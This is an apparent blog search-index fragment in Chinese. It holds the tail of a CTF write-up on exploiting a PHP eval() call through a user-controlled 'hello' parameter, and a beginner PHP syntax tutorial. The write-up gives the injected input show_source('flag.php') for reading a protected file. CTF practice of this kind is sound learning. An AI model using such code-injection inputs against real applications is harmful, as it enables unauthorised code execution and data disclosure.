title="大体流程"></a>大体流程</h3><ul><li>使用php函数→用户输入→php函数转换→执行操作系统命令→获取flag</li><li>php函数直接查看flag</li></ul><p>本题定义了一个变量<code>$a</code>，以及赋一个用户可控的参数<code>hello</code>给$a,我们利用可控参数hello找到我们的flag,传值过程(hello→a→eval）<code>eval</code>函数将用户的输入转化为代码执行（执行系统命令）从而通过执行系统命令查看我们的flag.php文件</p><p>因为已知页面有<code>show_source()</code>函数，可以使用<code>show_source(&#39;flag.php&#39;)</code>直接查看<code>flag.php</code>页面</p><p><img src="/2021/06/10/CTF-PHP/2.png" alt="writeup"></p></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP基础</title>
      <link href="2021/06/08/PHP%E5%9F%BA%E7%A1%80/"/>
      <url>2021/06/08/PHP%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h2 id="PHP语言特点"><a href="#PHP语言特点" class="headerlink" title="PHP语言特点"></a>PHP语言特点</h2><p>1.php是后端语言，负责在服务器处理数据，并把数据返回给浏览器<br>2.php文件可以同时用前端语言和php来写，但是php代码片段（<?php ?>）部分不能加入其他语言<br>3.文件以.php结尾</p><h2 id="PHP语言规则"><a href="#PHP语言规则" class="headerlink" title="PHP语言规则"></a>PHP语言规则</h2><ol><li><p>php脚本以<code>&lt;?php开头，以?&gt;</code>结尾,php语句以分号结尾<br>eg:</p><pre><code class="php">&lt;?php        echo “hello world”;?&gt; </code></pre></li><li><p>php采用 <code>$变量名</code> 来定义一个变量<br>eg:名字一样，输出不一样</p><pre><code class="php">&lt;?php            $color = ‘red’;            $Color = ‘bule’;?&gt;</code></pre></li><li><p>单行注释:#和//<br>多行注释:/* */</p></li><li><p>变量规则:<br>1.php采用 <code>$变量名</code> 来定义一个变量<br>2.必须以<strong>字母/下划线开头</strong> 不能以数字开头<br>3.变量名只能包含<strong>字母（A-z）、数字（0-9）、下划线（_）</strong><br>4.弱类型变量，不必声明变量数据类型，可以赋任何数据类型的值，php会自动转换<br>5.无创建变量命令，首次赋值自动创建</p></li><li><p>输出方法</p><ul><li><code>echo ‘hello’;</code></li><li><code>echo (‘hello’);</code></li></ul></li></ol><h2 id="PHP五种基本数据类型"><a href="#PHP五种基本数据类型" class="headerlink" title="PHP五种基本数据类型"></a>PHP五种基本数据类型</h2><ol><li><p>字符串<code>string</code></p><ul><li><p>字符串要单引号或者双引号括起来</p></li><li><p>使用单引号，不解析字符串，即字符串包含变量名，只输出<strong>变量名</strong>不输出<strong>变量值</strong>，单引号输出纯文本，大白话就是里面是什么就输出什么</p></li><li><p>使用双引号，解析字符串，会解析变量从而输出变量值</p><p><img src="/2021/06/08/PHP%E5%9F%BA%E7%A1%80/1.jpg" alt="解析字符串的区别"></p></li><li><p>运算符</p><p>字符串运算符<code>.</code>:用于拼接字符串</p><p><img src="/2021/06/08/PHP%E5%9F%BA%E7%A1%80/2.png.jpg" alt="拼接字符串"></p><p>比较运算符</p><img src="/2021/06/08/PHP%E5%9F%BA%E7%A1%80/3.png.jpg" alt="运算符基础" style="zoom:33%;"></li></ul></li><li><p>布尔值</p><ul><li>0为假，非0为真</li><li>与：<code>and/&amp;&amp;  </code> 或：<code>or/|| </code></li></ul></li><li><p>条件判断 </p><p>if（判断条件）{控制块}<br>if($count&gt;60)<br>{<br>echo ‘及格’<br>} </p></li></ol><h2 id="PHP日志"><a href="#PHP日志" class="headerlink" title="PHP日志"></a>PHP日志</h2><p>1.位于 /var/log/httpd 路径下，error_log是报错日志，当php运行报错的时候，可使用<code>tail -n 5 error_log</code> 查看最后5行报错信息，也就是最新的报错信息</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
